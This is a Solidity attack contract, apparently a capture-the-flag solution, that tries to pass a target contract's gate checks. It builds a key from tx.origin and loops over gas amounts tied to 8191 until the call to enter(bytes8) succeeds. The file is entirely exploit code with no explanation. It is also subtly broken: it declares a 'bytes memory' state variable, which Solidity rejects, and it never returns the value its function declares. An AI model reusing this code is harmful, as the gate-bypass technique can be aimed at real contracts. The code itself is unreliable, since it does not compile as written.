// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateSkipper {

    address target = 0x351a6E432063B56e5695f8BE18A7c8936a029787;
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);

    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
      key
    );

    function entrance() public returns (bytes memory) {
        for(uint256 i = 0; i < 120; i++) {
            (bool result, ) = address(target).call{gas: i + 150 + 8191*3}(encodedParams);
            if(result) break;
        }
    }
}
